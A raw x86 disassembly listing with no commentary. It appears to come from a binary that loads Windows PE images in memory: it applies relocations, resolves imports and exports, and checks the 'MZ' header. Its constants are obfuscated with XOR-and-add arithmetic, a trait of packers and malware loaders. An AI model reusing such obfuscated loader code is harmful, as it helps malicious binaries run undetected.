  42137b:	mov    edx,DWORD PTR [ebp-0x8]
  42137e:	cmp    edx,DWORD PTR [ecx+0xa4]
  421384:	jae    0x421397
  421386:	add    eax,DWORD PTR [ebp-0xc]
  421389:	mov    edx,DWORD PTR [eax+0x4]
  42138c:	mov    DWORD PTR [ebp-0xc],edx
  42138f:	test   edx,edx
  421391:	jne    0x42130f
  421397:	mov    eax,DWORD PTR [ebp-0x10]
  42139a:	mov    DWORD PTR [ebp-0x6c],eax
  42139d:	mov    DWORD PTR [ebp-0x70],0x4
  4213a4:	mov    eax,DWORD PTR [ecx+0x50]
  4213a7:	mov    DWORD PTR [ebp-0x68],eax
  4213aa:	mov    eax,DWORD PTR [ebp-0x1c]
  4213ad:	xor    eax,esi
  4213af:	add    eax,edi
  4213b1:	mov    DWORD PTR [ebp-0x64],eax
  4213b4:	lea    eax,[ebp-0x20]
  4213b7:	mov    DWORD PTR [ebp-0x60],eax
  4213ba:	lea    eax,[ebp-0x70]
  4213bd:	push   eax
  4213be:	mov    eax,DWORD PTR [ebp+0x8]
  4213c1:	xor    eax,esi
  4213c3:	add    eax,edi
  4213c5:	push   eax
  4213c6:	mov    eax,DWORD PTR [ebp+0x20]
  4213c9:	add    eax,0xee
  4213ce:	push   eax
  4213cf:	mov    eax,DWORD PTR [ebp+0x20]
  4213d2:	mov    eax,DWORD PTR [eax+0x198]
  4213d8:	push   DWORD PTR [eax]
  4213da:	mov    eax,DWORD PTR [ebp+0x10]
  4213dd:	call   eax
  4213df:	mov    eax,DWORD PTR [ebp+0x20]
  4213e2:	mov    eax,DWORD PTR [eax+0x180]
  4213e8:	add    eax,DWORD PTR [ebp+0xc]
  4213eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213ee:	push   DWORD PTR [ebp+0x18]
  4213f1:	mov    DWORD PTR [eax],ecx
  4213f3:	push   DWORD PTR [ebp+0x14]
  4213f6:	push   DWORD PTR [ebp+0x1c]
  4213f9:	call   ebx
  4213fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213fe:	add    ecx,DWORD PTR [ebp+0x20]
  421401:	lea    eax,[ebp+0x4]
  421404:	mov    DWORD PTR [ebp+0x20],ecx
  421407:	mov    ecx,DWORD PTR [ebp+0x20]
  42140a:	mov    ecx,DWORD PTR [ebp+0x20]
  42140d:	mov    edx,DWORD PTR [ecx+0x190]
  421413:	mov    ecx,DWORD PTR [ebp+0x20]
  421416:	mov    ecx,DWORD PTR [ecx+0x18c]
  42141c:	mov    esi,DWORD PTR [ecx]
  42141e:	cmp    DWORD PTR [eax],esi
  421420:	jb     0x421441
  421422:	mov    esi,DWORD PTR [edx]
  421424:	mov    edi,DWORD PTR [edx]
  421426:	mov    esi,DWORD PTR [esi+0x3c]
  421429:	lea    esi,[edi+esi*1+0x50]
  42142d:	mov    edi,DWORD PTR [ecx]
  42142f:	add    edi,DWORD PTR [esi]
  421431:	cmp    DWORD PTR [eax],edi
  421433:	jae    0x421441
  421435:	mov    esi,DWORD PTR [ecx]
  421437:	mov    ecx,DWORD PTR [eax]
  421439:	mov    edx,DWORD PTR [edx]
  42143b:	sub    ecx,esi
  42143d:	add    edx,ecx
  42143f:	mov    DWORD PTR [eax],edx
  421441:	mov    eax,DWORD PTR [ebp+0xc]
  421444:	jmp    0x421448
  421446:	xor    eax,eax
  421448:	pop    edi
  421449:	pop    esi
  42144a:	pop    ebx
  42144b:	leave  
  42144c:	ret    0x1c
  42144f:	push   ebp
  421450:	mov    ebp,esp
  421452:	sub    esp,0x1c
  421455:	push   esi
  421456:	mov    esi,eax
  421458:	mov    eax,DWORD PTR [ecx+0x190]
  42145e:	cmp    DWORD PTR [eax],0x0
  421461:	je     0x421571
  421467:	test   edx,edx
  421469:	je     0x421571
  42146f:	test   esi,esi
  421471:	je     0x421571
  421477:	mov    eax,DWORD PTR [esi+0x88]
  42147d:	test   eax,eax
  42147f:	je     0x42156c
  421485:	cmp    DWORD PTR [esi+0x8c],0x10
  42148c:	je     0x42156c
  421492:	cmp    DWORD PTR [esi+0x34],edx
  421495:	je     0x42156c
  42149b:	mov    esi,DWORD PTR [ecx+0x18c]
  4214a1:	and    DWORD PTR [ebp-0x10],0x0
  4214a5:	mov    ecx,edx
  4214a7:	sub    ecx,DWORD PTR [esi]
  4214a9:	add    eax,edx
  4214ab:	movzx  edx,WORD PTR [eax+0xc]
  4214af:	mov    DWORD PTR [ebp-0x1c],ecx
  4214b2:	movzx  ecx,WORD PTR [eax+0xe]
  4214b6:	add    ecx,edx
  4214b8:	je     0x42156c
  4214be:	lea    ecx,[eax+0x14]
  4214c1:	push   ebx
  4214c2:	mov    DWORD PTR [ebp-0x18],ecx
  4214c5:	mov    esi,0x7fffffff
  4214ca:	push   edi
  4214cb:	test   DWORD PTR [ecx],esi
  4214cd:	je     0x42154e
  4214cf:	mov    edx,DWORD PTR [ecx]
  4214d1:	and    DWORD PTR [ebp-0xc],0x0
  4214d5:	and    edx,esi
  4214d7:	add    edx,eax
  4214d9:	movzx  edi,WORD PTR [edx+0xe]
  4214dd:	movzx  ebx,WORD PTR [edx+0xc]
  4214e1:	add    edi,ebx
  4214e3:	je     0x42154e
  4214e5:	lea    ecx,[edx+0x14]
  4214e8:	mov    DWORD PTR [ebp-0x14],ecx
  4214eb:	test   DWORD PTR [ecx],esi
  4214ed:	je     0x421530
  4214ef:	mov    ecx,DWORD PTR [ecx]
  4214f1:	and    DWORD PTR [ebp-0x8],0x0
  4214f5:	and    ecx,esi
  4214f7:	add    ecx,eax
  4214f9:	movzx  edi,WORD PTR [ecx+0xe]
  4214fd:	movzx  ebx,WORD PTR [ecx+0xc]
  421501:	add    edi,ebx
  421503:	je     0x421530
  421505:	lea    edi,[ecx+0x14]
  421508:	mov    DWORD PTR [ebp-0x4],edi
  42150b:	mov    edi,DWORD PTR [ebp-0x4]
  42150e:	mov    edi,DWORD PTR [edi]
  421510:	test   edi,edi
  421512:	je     0x42151a
  421514:	mov    ebx,DWORD PTR [ebp-0x1c]
  421517:	add    DWORD PTR [edi+eax*1],ebx
  42151a:	movzx  edi,WORD PTR [ecx+0xe]
  42151e:	movzx  ebx,WORD PTR [ecx+0xc]
  421522:	inc    DWORD PTR [ebp-0x8]
  421525:	add    DWORD PTR [ebp-0x4],0x8
  421529:	add    edi,ebx
  42152b:	cmp    DWORD PTR [ebp-0x8],edi
  42152e:	jb     0x42150b
  421530:	movzx  edi,WORD PTR [edx+0xe]
  421534:	movzx  ebx,WORD PTR [edx+0xc]
  421538:	mov    ecx,DWORD PTR [ebp-0x14]
  42153b:	inc    DWORD PTR [ebp-0xc]
  42153e:	add    ecx,0x8
  421541:	add    edi,ebx
  421543:	mov    DWORD PTR [ebp-0x14],ecx
  421546:	cmp    DWORD PTR [ebp-0xc],edi
  421549:	jb     0x4214eb
  42154b:	mov    ecx,DWORD PTR [ebp-0x18]
  42154e:	movzx  edx,WORD PTR [eax+0xe]
  421552:	movzx  edi,WORD PTR [eax+0xc]
  421556:	inc    DWORD PTR [ebp-0x10]
  421559:	add    ecx,0x8
  42155c:	add    edx,edi
  42155e:	mov    DWORD PTR [ebp-0x18],ecx
  421561:	cmp    DWORD PTR [ebp-0x10],edx
  421564:	jb     0x4214cb
  42156a:	pop    edi
  42156b:	pop    ebx
  42156c:	xor    eax,eax
  42156e:	inc    eax
  42156f:	jmp    0x421573
  421571:	xor    eax,eax
  421573:	pop    esi
  421574:	leave  
  421575:	ret    
  421576:	push   ebp
  421577:	mov    ebp,esp
  421579:	mov    ecx,DWORD PTR [ecx+0x190]
  42157f:	mov    eax,DWORD PTR [ebp+0xc]
  421582:	sub    esp,0x10
  421585:	push   ebx
  421586:	xor    ebx,ebx
  421588:	push   esi
  421589:	push   edi
  42158a:	cmp    DWORD PTR [ecx],ebx
  42158c:	je     0x421614
  421592:	cmp    eax,ebx
  421594:	je     0x421614
  421596:	cmp    DWORD PTR [eax+0x78],ebx
  421599:	jne    0x4215a0
  42159b:	xor    eax,eax
  42159d:	inc    eax
  42159e:	jmp    0x421616
  4215a0:	mov    eax,DWORD PTR [eax+0x78]
  4215a3:	add    eax,DWORD PTR [ebp+0x8]
  4215a6:	mov    ecx,DWORD PTR [eax+0x1c]
  4215a9:	mov    edx,DWORD PTR [eax+0x24]
  4215ac:	mov    esi,DWORD PTR [eax+0x14]
  4215af:	mov    edi,DWORD PTR [eax+0x18]
  4215b2:	add    ecx,DWORD PTR [ebp+0x8]
  4215b5:	add    edx,DWORD PTR [ebp+0x8]
  4215b8:	mov    DWORD PTR [ebp-0x4],esi
  4215bb:	cmp    esi,edi
  4215bd:	ja     0x4215c2
  4215bf:	mov    DWORD PTR [ebp-0x4],edi
  4215c2:	mov    DWORD PTR [ebp-0x8],ebx
  4215c5:	cmp    DWORD PTR [ebp-0x4],ebx
  4215c8:	jbe    0x42159b
  4215ca:	cmp    ebx,DWORD PTR [eax+0x14]
  4215cd:	jae    0x4215d5
  4215cf:	movzx  esi,WORD PTR [edx+ebx*2]
  4215d3:	jmp    0x4215d7
  4215d5:	mov    esi,ebx
  4215d7:	lea    esi,[ecx+esi*4]
  4215da:	mov    edi,DWORD PTR [esi]
  4215dc:	test   edi,edi
  4215de:	je     0x421609
  4215e0:	add    edi,DWORD PTR [ebp+0x8]
  4215e3:	mov    DWORD PTR [ebp-0x10],edi
  4215e6:	cmp    edi,eax
  4215e8:	jbe    0x4215fa
  4215ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4215ed:	mov    ebx,DWORD PTR [ebx+0x7c]
  4215f0:	add    ebx,eax
  4215f2:	cmp    edi,ebx
  4215f4:	jae    0x4215fa
  4215f6:	mov    esi,DWORD PTR [esi]
  4215f8:	jmp    0x421602
  4215fa:	sub    edi,DWORD PTR [ebp+0x8]
  4215fd:	mov    DWORD PTR [esi],edi
  4215ff:	mov    esi,DWORD PTR [ebp-0x10]
  421602:	test   esi,esi
  421604:	je     0x421614
  421606:	mov    ebx,DWORD PTR [ebp-0x8]
  421609:	inc    ebx
  42160a:	mov    DWORD PTR [ebp-0x8],ebx
  42160d:	cmp    ebx,DWORD PTR [ebp-0x4]
  421610:	jb     0x4215ca
  421612:	jmp    0x42159b
  421614:	xor    eax,eax
  421616:	pop    edi
  421617:	pop    esi
  421618:	pop    ebx
  421619:	leave  
  42161a:	ret    0x8
  42161d:	push   ebp
  42161e:	mov    ebp,esp
  421620:	sub    esp,0x2c
  421623:	mov    edx,0xf89c85b5
  421628:	mov    DWORD PTR [ebp-0x4],edx
  42162b:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  421632:	mov    eax,DWORD PTR [ebp-0x4]
  421635:	mov    ecx,DWORD PTR [ebp-0x4]
  421638:	mov    ecx,DWORD PTR [ebp-0x4]
  42163b:	mov    ecx,DWORD PTR [ebp-0x4]
  42163e:	mov    ecx,DWORD PTR [ebp-0x4]
  421641:	mov    ecx,DWORD PTR [ebp-0x4]
  421644:	push   ebx
  421645:	mov    ebx,DWORD PTR [ebp+0x10]
  421648:	push   esi
  421649:	mov    esi,0x75108b3
  42164e:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  421655:	mov    ecx,DWORD PTR [ebp-0x4]
  421658:	mov    ebx,DWORD PTR [ebx+0x190]
  42165e:	push   edi
  42165f:	mov    edi,0x3272fa
  421664:	xor    ecx,esi
  421666:	xor    eax,esi
  421668:	add    eax,edi
  42166a:	add    ecx,edi
  42166c:	mov    DWORD PTR [ebp-0x18],eax
  42166f:	cmp    ecx,DWORD PTR [ebx]
  421671:	je     0x4218f2
  421677:	mov    ebx,DWORD PTR [ebp-0x4]
  42167a:	mov    ecx,DWORD PTR [ebp+0xc]
  42167d:	xor    ebx,esi
  42167f:	add    ebx,edi
  421681:	cmp    ebx,ecx
  421683:	je     0x4218f2
  421689:	mov    ebx,DWORD PTR [ebp-0x4]
  42168c:	mov    ecx,DWORD PTR [ecx+0x80]
  421692:	xor    ebx,esi
  421694:	add    ebx,edi
  421696:	cmp    ecx,ebx
  421698:	je     0x4218ed
  42169e:	add    ecx,DWORD PTR [ebp+0x8]
  4216a1:	mov    DWORD PTR [ebp-0x2c],ecx
  4216a4:	mov    ebx,edx
  4216a6:	xor    ebx,esi
  4216a8:	add    ebx,edi
  4216aa:	mov    DWORD PTR [ebp-0x10],ebx
  4216ad:	mov    ebx,DWORD PTR [ebp-0x10]
  4216b0:	cmp    ebx,edx
  4216b2:	je     0x4216c6
  4216b4:	mov    edx,DWORD PTR [ebp-0x10]
  4216b7:	mov    ebx,DWORD PTR [ebp-0x4]
  4216ba:	imul   edx,edx,0x14
  4216bd:	xor    ebx,esi
  4216bf:	add    ebx,edi
  4216c1:	cmp    DWORD PTR [edx+ecx*1],ebx
  4216c4:	jne    0x4216dd
  4216c6:	mov    edx,DWORD PTR [ebp-0x10]
  4216c9:	mov    ebx,DWORD PTR [ebp-0x4]
  4216cc:	imul   edx,edx,0x14
  4216cf:	xor    ebx,esi
  4216d1:	add    ebx,edi
  4216d3:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4216d7:	je     0x4218df
  4216dd:	mov    eax,DWORD PTR [ebp-0x4]
  4216e0:	mov    ebx,DWORD PTR [ebp-0x4]
  4216e3:	mov    eax,DWORD PTR [ebp-0x10]
  4216e6:	imul   eax,eax,0x14
  4216e9:	add    eax,ecx
  4216eb:	mov    ecx,DWORD PTR [eax+0x10]
  4216ee:	add    ecx,DWORD PTR [ebp+0x8]
  4216f1:	xor    ebx,esi
  4216f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4216f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4216f9:	mov    edx,DWORD PTR [ebp-0x4]
  4216fc:	xor    ecx,esi
  4216fe:	add    ecx,edi
  421700:	xor    edx,esi
  421702:	mov    DWORD PTR [ebp-0x24],ecx
  421705:	mov    ecx,DWORD PTR [eax]
  421707:	add    edx,edi
  421709:	add    ebx,edi
  42170b:	cmp    ecx,edx
  42170d:	je     0x421715
  42170f:	add    ecx,DWORD PTR [ebp+0x8]
  421712:	mov    DWORD PTR [ebp-0x24],ecx
  421715:	mov    ecx,DWORD PTR [ebp-0x4]
  421718:	xor    ecx,esi
  42171a:	add    ecx,DWORD PTR [eax+0xc]
  42171d:	mov    eax,DWORD PTR [ebp+0x8]
  421720:	lea    eax,[ecx+eax*1+0x3272fa]
  421727:	mov    DWORD PTR [ebp+0xc],eax
  42172a:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  421731:	mov    eax,DWORD PTR [ebp+0x10]
  421734:	push   DWORD PTR [ebp+0xc]
  421737:	mov    eax,DWORD PTR [eax+0x1e0]
  42173d:	call   DWORD PTR [eax]
  42173f:	mov    ecx,DWORD PTR [ebp-0x4]
  421742:	xor    ecx,esi
  421744:	add    ecx,edi
  421746:	mov    DWORD PTR [ebp-0xc],eax
  421749:	cmp    ecx,eax
  42174b:	jne    0x42175f
  42174d:	mov    eax,DWORD PTR [ebp+0x10]
  421750:	push   DWORD PTR [ebp+0xc]
  421753:	mov    eax,DWORD PTR [eax+0x1e0]
  421759:	call   DWORD PTR [eax+0xc]
  42175c:	mov    DWORD PTR [ebp-0xc],eax
  42175f:	mov    DWORD PTR [ebp-0x20],0x7f661bcc
  421766:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  42176d:	mov    eax,DWORD PTR [ebp-0x4]
  421770:	xor    eax,esi
  421772:	add    eax,edi
  421774:	cmp    eax,DWORD PTR [ebp-0xc]
  421777:	jne    0x42179c
  421779:	mov    eax,DWORD PTR [ebp-0x8]
  42177c:	mov    ecx,DWORD PTR [ebp-0x20]
  42177f:	xor    eax,esi
  421781:	xor    ecx,esi
  421783:	lea    ebx,[ebx+eax*1+0x3272fa]
  42178a:	mov    eax,DWORD PTR [ebp+0x10]
  42178d:	mov    eax,DWORD PTR [eax+0x1e0]
  421793:	add    ecx,edi
  421795:	imul   ecx,ebx
  421798:	push   ecx
  421799:	call   DWORD PTR [eax+0x24]
  42179c:	mov    eax,DWORD PTR [ebp-0x4]
  42179f:	xor    eax,esi
  4217a1:	add    eax,edi
  4217a3:	cmp    eax,DWORD PTR [ebp-0xc]
  4217a6:	jne    0x4217b7
  4217a8:	mov    eax,DWORD PTR [ebp-0x28]
  4217ab:	xor    eax,esi
  4217ad:	add    eax,edi
  4217af:	cmp    ebx,eax
  4217b1:	jbe    0x421731
  4217b7:	mov    eax,DWORD PTR [ebp-0x4]
  4217ba:	xor    eax,esi
  4217bc:	add    eax,edi
  4217be:	cmp    eax,DWORD PTR [ebp-0xc]
  4217c1:	jne    0x4217da
  4217c3:	mov    eax,DWORD PTR [ebp-0x8]
  4217c6:	mov    ecx,DWORD PTR [ebp-0x18]
  4217c9:	xor    eax,esi
  4217cb:	lea    eax,[ecx+eax*1+0x3272fa]
  4217d2:	mov    DWORD PTR [ebp-0x18],eax
  4217d5:	jmp    0x4218c9
  4217da:	mov    DWORD PTR [ebp-0x14],0x1121bcd
  4217e1:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  4217e8:	mov    ebx,DWORD PTR [ebp-0x4]
  4217eb:	xor    ebx,esi
  4217ed:	add    ebx,edi
  4217ef:	jmp    0x4218b6
  4217f4:	mov    eax,DWORD PTR [ebp-0x4]
  4217f7:	xor    eax,esi
  4217f9:	add    eax,edi
  4217fb:	mov    DWORD PTR [ebp-0x14],eax
  4217fe:	mov    eax,DWORD PTR [ebp-0x4]
  421801:	xor    eax,esi
  421803:	add    eax,edi
  421805:	mov    DWORD PTR [ebp+0xc],eax
  421808:	mov    ecx,DWORD PTR [ebp-0x4]
  42180b:	mov    eax,DWORD PTR [ebp-0x24]
  42180e:	xor    ecx,esi
  421810:	add    ecx,edi
  421812:	cmp    ecx,eax
  421814:	je     0x42181c
  421816:	mov    eax,DWORD PTR [eax+ebx*4]
  421819:	mov    DWORD PTR [ebp-0x14],eax
  42181c:	mov    eax,DWORD PTR [ebp-0x1c]
  42181f:	mov    eax,DWORD PTR [eax+ebx*4]
  421822:	mov    DWORD PTR [ebp+0xc],eax
  421825:	mov    eax,DWORD PTR [ebp-0x4]
  421828:	mov    ecx,DWORD PTR [ebp-0x14]
  42182b:	xor    eax,esi
  42182d:	add    eax,edi
  42182f:	cmp    eax,ecx
  421831:	je     0x42185c
  421833:	mov    eax,DWORD PTR [ebp-0x4]
  421836:	mov    ecx,DWORD PTR [ebp-0x14]
  421839:	xor    eax,esi
  42183b:	add    eax,edi
  42183d:	shr    ecx,0x1f
  421840:	cmp    eax,ecx
  421842:	je     0x42185c
  421844:	mov    ecx,DWORD PTR [ebp-0x14]
  421847:	mov    eax,DWORD PTR [ebp+0x10]
  42184a:	mov    eax,DWORD PTR [eax+0x1e0]
  421850:	movzx  ecx,cx
  421853:	push   ecx
  421854:	push   DWORD PTR [ebp-0xc]
  421857:	call   DWORD PTR [eax+0x8]
  42185a:	jmp    0x421875
  42185c:	mov    eax,DWORD PTR [ebp+0xc]
  42185f:	add    eax,DWORD PTR [ebp+0x8]
  421862:	mov    ecx,DWORD PTR [ebp+0x10]
  421865:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42186b:	add    eax,0x2
  42186e:	push   eax
  42186f:	push   DWORD PTR [ebp-0xc]
  421872:	call   DWORD PTR [ecx+0x8]
  421875:	mov    DWORD PTR [ebp+0xc],eax
  421878:	mov    eax,DWORD PTR [ebp-0x4]
  42187b:	mov    ecx,DWORD PTR [ebp+0xc]
  42187e:	xor    eax,esi
  421880:	add    eax,edi
  421882:	cmp    eax,ecx
  421884:	mov    eax,DWORD PTR [ebp-0x8]
  421887:	jne    0x42189a
  421889:	mov    ecx,DWORD PTR [ebp-0x18]
  42188c:	xor    eax,esi
  42188e:	lea    eax,[ecx+eax*1+0x3272fa]
  421895:	mov    DWORD PTR [ebp-0x18],eax
  421898:	jmp    0x4218aa
  42189a:	mov    ecx,DWORD PTR [ebp+0xc]
  42189d:	xor    eax,esi
  42189f:	add    eax,edi
  4218a1:	imul   eax,ecx
  4218a4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218a7:	mov    DWORD PTR [ecx+ebx*4],eax
  4218aa:	mov    eax,DWORD PTR [ebp-0x8]
  4218ad:	xor    eax,esi
  4218af:	lea    ebx,[ebx+eax*1+0x3272fa]
  4218b6:	mov    eax,DWORD PTR [ebp-0x4]
  4218b9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218bc:	xor    eax,esi
  4218be:	add    eax,edi
  4218c0:	cmp    DWORD PTR [ecx+ebx*4],eax
  4218c3:	jne    0x4217f4
  4218c9:	mov    edx,DWORD PTR [ebp-0x10]
  4218cc:	mov    eax,DWORD PTR [ebp-0x18]
  4218cf:	mov    ecx,DWORD PTR [ebp-0x2c]
  4218d2:	sub    edx,0x3272f9
  4218d8:	xor    edx,esi
  4218da:	jmp    0x4216a4
  4218df:	mov    ecx,DWORD PTR [ebp-0x4]
  4218e2:	xor    ecx,esi
  4218e4:	add    ecx,edi
  4218e6:	cmp    eax,ecx
  4218e8:	mov    eax,DWORD PTR [ebp-0x4]
  4218eb:	jne    0x4218f5
  4218ed:	mov    eax,DWORD PTR [ebp-0x8]
  4218f0:	jmp    0x4218f5
  4218f2:	mov    eax,DWORD PTR [ebp-0x4]
  4218f5:	xor    eax,esi
  4218f7:	add    eax,edi
  4218f9:	pop    edi
  4218fa:	pop    esi
  4218fb:	pop    ebx
  4218fc:	leave  
  4218fd:	ret    0xc
  421900:	push   ebp
  421901:	mov    ebp,esp
  421903:	sub    esp,0x28
  421906:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42190d:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  421914:	mov    eax,DWORD PTR [ebp+0xc]
  421917:	mov    DWORD PTR [ebp+0xc],eax
  42191a:	push   esi
  42191b:	mov    eax,eax
  42191d:	mov    eax,DWORD PTR [ebp-0x4]
  421920:	mov    esi,DWORD PTR [ebp+0x8]
  421923:	mov    ecx,0x75108b3
  421928:	xor    eax,ecx
  42192a:	mov    edx,0x3272fa
  42192f:	add    eax,edx
  421931:	cmp    esi,eax
  421933:	je     0x421a5a
  421939:	mov    eax,DWORD PTR [ebp+0x8]
  42193c:	mov    esi,DWORD PTR [ebp+0x8]
  42193f:	add    esi,DWORD PTR [eax+0x3c]
  421942:	push   edi
  421943:	mov    DWORD PTR [ebp+0xc],esi
  421946:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  42194d:	mov    eax,DWORD PTR [ebp-0x1c]
  421950:	mov    esi,DWORD PTR [ebp-0x4]
  421953:	mov    edi,DWORD PTR [ebp+0xc]
  421956:	xor    esi,ecx
  421958:	xor    eax,ecx
  42195a:	add    esi,edx
  42195c:	cmp    DWORD PTR [edi+eax*8+0x1939848],esi
  421963:	je     0x421a54
  421969:	mov    esi,DWORD PTR [ebp+0xc]
  42196c:	mov    eax,DWORD PTR [ebp+0x8]
  42196f:	add    eax,DWORD PTR [esi+0xa0]
  421975:	mov    esi,DWORD PTR [ebp+0x8]
  421978:	mov    edi,DWORD PTR [ebp+0xc]
  42197b:	sub    esi,DWORD PTR [edi+0x34]
  42197e:	mov    edi,DWORD PTR [ebp-0x4]
  421981:	xor    edi,ecx
  421983:	add    edi,edx
  421985:	mov    DWORD PTR [ebp-0x24],esi
  421988:	cmp    esi,edi
  42198a:	je     0x421a54
  421990:	mov    esi,DWORD PTR [ebp-0x4]
  421993:	xor    esi,ecx
  421995:	add    esi,edx
  421997:	mov    DWORD PTR [ebp-0x8],esi
  42199a:	push   ebx
  42199b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4219a2:	jmp    0x421a3e
  4219a7:	mov    esi,DWORD PTR [ebp-0x4]
  4219aa:	xor    esi,ecx
  4219ac:	lea    edi,[ebx-0x8]
  4219af:	add    esi,edx
  4219b1:	shr    edi,1
  4219b3:	cmp    esi,edi
  4219b5:	jae    0x421a24
  4219b7:	sub    edi,esi
  4219b9:	lea    ebx,[eax+esi*2+0x8]
  4219bd:	mov    DWORD PTR [ebp-0x18],edi
  4219c0:	movzx  esi,WORD PTR [ebx]
  4219c3:	and    esi,0xfff
  4219c9:	mov    DWORD PTR [ebp-0x14],esi
  4219cc:	mov    edi,DWORD PTR [ebp-0x14]
  4219cf:	mov    esi,DWORD PTR [eax]
  4219d1:	sub    esi,edx
  4219d3:	add    edi,esi
  4219d5:	movzx  esi,WORD PTR [ebx]
  4219d8:	shr    esi,0xc
  4219db:	xor    edi,ecx
  4219dd:	mov    DWORD PTR [ebp-0x20],edi
  4219e0:	mov    DWORD PTR [ebp-0x14],esi
  4219e3:	mov    esi,DWORD PTR [ebp-0x20]
  4219e6:	mov    edi,DWORD PTR [ebp+0x8]
  4219e9:	xor    esi,ecx
  4219eb:	lea    esi,[esi+edi*1+0x3272fa]
  4219f2:	mov    DWORD PTR [ebp-0x20],esi
  4219f5:	mov    esi,DWORD PTR [ebp-0x10]
  4219f8:	mov    edi,DWORD PTR [ebp-0x14]
  4219fb:	xor    esi,ecx
  4219fd:	add    esi,edx
  4219ff:	cmp    edi,esi
  421a01:	jne    0x421a19
  421a03:	mov    esi,DWORD PTR [ebp-0x10]
  421a06:	mov    edi,DWORD PTR [ebp-0x14]
  421a09:	xor    esi,ecx
  421a0b:	add    esi,edx
  421a0d:	cmp    edi,esi
  421a0f:	jne    0x421a19
  421a11:	mov    esi,DWORD PTR [ebp-0x20]
  421a14:	mov    edi,DWORD PTR [ebp-0x24]
  421a17:	add    DWORD PTR [esi],edi
  421a19:	add    ebx,0x2
  421a1c:	dec    DWORD PTR [ebp-0x18]
  421a1f:	jne    0x4219c0
  421a21:	mov    ebx,DWORD PTR [ebp-0xc]
  421a24:	add    DWORD PTR [ebp-0x8],ebx
  421a27:	mov    esi,DWORD PTR [ebp-0x1c]
  421a2a:	mov    edi,DWORD PTR [ebp-0x8]
  421a2d:	mov    ebx,DWORD PTR [ebp+0xc]
  421a30:	xor    esi,ecx
  421a32:	cmp    edi,DWORD PTR [ebx+esi*8+0x193984c]
  421a39:	jae    0x421a53
  421a3b:	add    eax,DWORD PTR [ebp-0xc]
  421a3e:	mov    esi,DWORD PTR [ebp-0x4]
  421a41:	mov    ebx,DWORD PTR [eax+0x4]
  421a44:	xor    esi,ecx
  421a46:	add    esi,edx
  421a48:	mov    DWORD PTR [ebp-0xc],ebx
  421a4b:	cmp    ebx,esi
  421a4d:	jne    0x4219a7
  421a53:	pop    ebx
  421a54:	mov    eax,DWORD PTR [ebp-0x28]
  421a57:	pop    edi
  421a58:	jmp    0x421a5d
  421a5a:	mov    eax,DWORD PTR [ebp-0x4]
  421a5d:	xor    eax,ecx
  421a5f:	add    eax,edx
  421a61:	pop    esi
  421a62:	leave  
  421a63:	ret    0x8
  421a66:	push   ebp
  421a67:	mov    ebp,esp
  421a69:	sub    esp,0xd8
  421a6f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  421a76:	mov    DWORD PTR [ebp-0x24],0xf89c85b4
  421a7d:	mov    eax,DWORD PTR [ebp-0x4]
  421a80:	push   ebx
  421a81:	push   esi
  421a82:	mov    esi,0x75108b3
  421a87:	xor    eax,esi
  421a89:	push   edi
  421a8a:	mov    edi,0x3272fa
  421a8f:	add    eax,edi
  421a91:	mov    DWORD PTR [ebp-0x18],eax
  421a94:	mov    eax,DWORD PTR [ebp-0x4]
  421a97:	xor    eax,esi
  421a99:	add    eax,edi
  421a9b:	mov    DWORD PTR [ebp-0x8],eax
  421a9e:	mov    ebx,DWORD PTR [ebp+0x20]
  421aa1:	mov    eax,DWORD PTR [ebp-0x1c]
  421aa4:	mov    ecx,DWORD PTR [ebp-0x1c]
  421aa7:	xor    eax,ecx
  421aa9:	mov    DWORD PTR [ebp-0x1c],eax
  421aac:	add    DWORD PTR [ebp-0x1c],0xf89cb5b5
  421ab3:	mov    eax,DWORD PTR [ebp-0xc]
  421ab6:	mov    ecx,DWORD PTR [ebp-0xc]
  421ab9:	xor    eax,ecx
  421abb:	mov    DWORD PTR [ebp-0xc],eax
  421abe:	add    DWORD PTR [ebp-0xc],0xf89c85f5
  421ac5:	mov    eax,DWORD PTR [ebp-0x10]
  421ac8:	mov    ecx,DWORD PTR [ebp-0x10]
  421acb:	xor    eax,ecx
  421acd:	mov    DWORD PTR [ebp-0x10],eax
  421ad0:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  421ad7:	mov    eax,DWORD PTR [ebp-0x28]
  421ada:	mov    ecx,DWORD PTR [ebp-0x28]
  421add:	xor    eax,ecx
  421adf:	mov    DWORD PTR [ebp-0x28],eax
  421ae2:	add    DWORD PTR [ebp-0x28],0xf89f05b5
  421ae9:	mov    DWORD PTR [ebp+0x20],0xf89cefe0
  421af0:	mov    eax,DWORD PTR [ebp+0x8]
  421af3:	test   eax,eax
  421af5:	je     0x421f7c
  421afb:	mov    eax,DWORD PTR [ebp+0xc]
  421afe:	test   eax,eax
  421b00:	je     0x421f7c
  421b06:	mov    eax,DWORD PTR [ebp+0x18]
  421b09:	test   eax,eax
  421b0b:	je     0x421f7c
  421b11:	mov    eax,DWORD PTR [ebp+0x20]
  421b14:	mov    ecx,DWORD PTR [ebp+0x8]
  421b17:	xor    eax,0x8b3
  421b1c:	add    eax,0x72fa
  421b21:	cmp    WORD PTR [ecx],ax
  421b24:	jne    0x421f7c
  421b2a:	mov    eax,DWORD PTR [ebp-0x4]
  421b2d:	xor    eax,esi
  421b2f:	add    eax,edi
  421b31:	mov    DWORD PTR [ebp-0x30],eax
  421b34:	mov    eax,DWORD PTR [ebp-0x4]
  421b37:	mov    ecx,DWORD PTR [ebp+0x8]
  421b3a:	mov    eax,DWORD PTR [ebp+0x8]
  421b3d:	add    eax,DWORD PTR [ecx+0x3c]
